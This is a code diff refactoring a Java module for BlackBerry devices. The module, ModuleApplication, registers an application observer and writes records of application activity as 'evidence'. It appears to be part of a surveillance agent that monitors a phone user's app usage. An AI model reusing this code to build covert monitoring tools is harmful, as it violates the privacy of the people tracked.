@@ -13,10 +13,11 @@ package blackberry.module;
 import java.util.Vector;
 
 import blackberry.AppListener;
-import blackberry.config.Conf;
+import blackberry.config.ConfModule;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.evidence.Evidence;
+import blackberry.evidence.EvidenceType;
 import blackberry.interfaces.ApplicationObserver;
 import blackberry.utils.Check;
 import blackberry.utils.DateTime;
@@ -31,45 +32,16 @@ public final class ModuleApplication extends BaseModule implements
     //#ifdef DEBUG
     private static Debug debug = new Debug("ApplicationAgent",
             DebugLevel.VERBOSE);
+    private Evidence evidence;
+
     //#endif
 
-    
-
-    //boolean firstRun = true;
-
-    /**
-     * Instantiates a new application agent.
-     * 
-     * @param agentStatus
-     *            the agent status
-     */
-    public ModuleApplication(final boolean agentStatus) {
-        super(BaseModule.AGENT_APPLICATION, agentStatus,
-                Conf.AGENT_APPLICATION_ON_SD, "ApplicationAgent");
+    public boolean parse(ConfModule conf) {
+        return true;
     }
 
-    /**
-     * Instantiates a new application agent.
-     * 
-     * @param agentStatus
-     *            the agent status
-     * @param confParams
-     *            the conf params
-     */
-    protected ModuleApplication(final boolean agentStatus,
-            final byte[] confParams) {
-        this(agentStatus);
-        parse(confParams);
-
-        //status=Status.getInstance();
-        status.applicationAgentFirstRun = true;
-    }
-
-    /*
-     * (non-Javadoc)
-     * @see blackberry.threadpool.TimerJob#actualRun()
-     */
     public void actualGo() {
+
     }
 
     /*
@@ -80,8 +52,10 @@ public final class ModuleApplication extends BaseModule implements
         //#ifdef DEBUG
         debug.trace("actualStart addApplicationListObserver");
         //#endif
-
+        evidence = new Evidence(EvidenceType.APPLICATION);
+        status.applicationAgentFirstRun = true;
         AppListener.getInstance().addApplicationObserver(this);
+        
     }
 
     /*
@@ -151,6 +125,7 @@ public final class ModuleApplication extends BaseModule implements
         items.addElement(WChar.getBytes(mod, true));
         items.addElement(Utils.intToByteArray(Evidence.E_DELIMITER));
 
+        
         evidence.atomicWriteOnce(items);
 
     }
